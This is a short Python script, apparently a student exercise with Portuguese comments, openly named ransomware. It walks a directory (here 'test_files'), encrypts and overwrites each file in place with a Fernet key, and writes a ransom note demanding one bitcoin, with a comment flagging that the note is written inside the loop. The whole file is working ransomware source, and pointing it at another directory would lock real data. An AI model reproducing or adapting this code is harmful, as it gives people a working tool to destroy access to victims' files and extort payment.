from cryptography.fernet import Fernet

import os

#1. Gerar uma chave de criptografia e salvar

def gerar_chave():

    chave = Fernet.generate_key()

    with open("chave.key","wb") as chave_file:

        chave_file.write(chave)

#2. Carregar a chave salva

def carregar_chave():

    return open("chave.key", "rb").read()


#3. Criptografar um unico arquivo

def criptografar_arquivo(arquivo, chave):

    f=Fernet(chave)

    with open(arquivo, "rb") as file:

        dados = file.read()

    dados_encriptados = f.encrypt(dados)

    with open (arquivo, "wb") as file:

        file.write(dados_encriptados)

#4. encontrar arquivos para criptografar

def encontra_arquivos(diretorio):

    lista = []

    for raiz, _, arquivos in os.walk(diretorio):

        for nome in arquivos:

            caminho = os.path.join(raiz, nome)

            if nome != "ransonware.py" and not nome.endswith(".key"):

                lista.append(caminho)

    return lista

#5.  mensagem de resgate

def criar_mensagem_resgate():

    with open("lEIA isso.txt", "w") as f:

        f.write("Seus arquivos foram criptografados!\n")

        f.write("Envie 1 bitcoin para o endereço X e envie o Comprovante!\n")

        f.write("depois diosso, enviaremos a chave para você recuperar seus dados. \n")

#6. execução principal

# Trecho da sua função main()

def main ():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontra_arquivos("test_files")
    
    # Início do loop
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        
        # !! PROBLEMA LÓGICO !!
        criar_mensagem_resgate() 
        print("Ransoware executado! arquivos criptogrados!")
    # Fim do loop

if __name__=="__main__":

    main()